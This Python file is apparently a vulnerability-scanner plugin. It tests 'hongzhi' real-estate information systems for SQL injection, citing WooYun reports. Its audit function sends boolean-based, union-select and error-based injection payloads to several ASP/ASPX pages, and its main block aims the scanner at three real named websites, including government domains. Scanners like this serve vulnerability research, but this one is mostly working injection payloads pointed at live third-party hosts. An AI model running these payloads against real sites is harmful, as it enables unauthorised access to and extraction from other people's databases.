#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-079522
#refer:http://www.wooyun.org/bugs/wooyun-2010-086386
#refer:http://www.wooyun.org/bugs/wooyun-2010-086420
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107410
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107625
#refer:http://www.wooyun.org/bugs/wooyun-2010-0108362
#refer:http://www.wooyun.org/bugs/wooyun-2010-0110327
#refer:http://www.wooyun.org/bugs/wooyun-2010-0110638

import re

def assign(service, arg):
    if service == "hongzhi":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'PubInfo/lpxx.asp?qyxmbm=1',
        'web/PubInfo/lpxx.asp?qyxmbm=1',
        'PubInfo/StatData.asp?QryToday=1',
        'web/PubInfo/StatData.asp?QryToday=1',
        'PubInfo/AreaAnalysis.asp?Qrylx=Qrylx=gymj&Qryszqx=1',
        'web/PubInfo/AreaAnalysis.asp?Qrylx=Qrylx=gymj&Qryszqx=1'
        ]
    getdata1 = '%27%20or%20%271%27%3D%271'
    getdata2 = '%27%20or%20%271%27%3D%272'
    for payload in payloads:
        url1 = arg + payload +getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        m1 = re.findall('td',res1)
        m2 = re.findall('td',res2)
        if m1 != m2:
            security_hole(arg + payload + '   :found sql Injection')

            
            
    payloads = [
        'pubinfo/xmdljgxx_Detail.asp?jgbh=',
        'web/pubinfo/xmdljgxx_Detail.asp?jgbh=',    
        ]
    getdata = '%27%20union%20all%20select%201,2,3,4,5,6,7,8,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),10,11,12,13,14--'
    for payload in payloads:
        url = arg + payload + getdata 
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + payload + '   :found sql Injection')
            
    
    payloads = [
        'Article.asp?wzxh=1',
        'web/Article.asp?wzxh=1',
        ]
    getdata1 = '%20or%201=1'
    getdata2 = '%20or%201=2'
    for payload in payloads:
        url1 = arg + payload + getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        if code1 == 200 and code2 == 200 and 'href' in res1 and 'href' not in res2:
            security_hole(arg + payload + '   :found sql Injection')
        
        
        
    payloads = [
        'PubInfo/Ranklist.asp?rank=',
        'web/PubInfo/Ranklist.asp?rank='
        ]
    getdata = 'sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))'
    for payload in payloads:
        url = arg + payload + getdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + payload + '   :found sql Injection')
    
    
    
    payloads = [
        'Web_Site/NewsMore.aspx?lmid=1',
        'web/Web_Site/NewsMore.aspx?lmid=1'
        ]
    getdata = '%29and%20db_name%281%29=0--'
    for payload in payloads:
        url = arg + payload + getdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==500 and 'master' in res:
            security_hole(arg + payload + '   :found sql Injection')
     

     
    payloads = [
        'Web_Site/Search.aspx?type=0&keyword=',
        'web/Web_Site/Search.aspx?type=0&keyword='
        ]
    getdata = '%27and%20db_name%281%29%3D0--'
    for payload in payloads:
        url = arg + payload + getdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code ==500 and 'master' in res:
            security_hole(arg + payload + '   :found sql Injection')   

if __name__ == '__main__':
    from dummy import *
    audit(assign('hongzhi', 'http://www.essfdc.gov.cn/')[1])
    audit(assign('hongzhi', 'http://www.haxfdc.com/')[1])
    audit(assign('hongzhi', 'http://www.tmfdc.gov.cn/')[1])
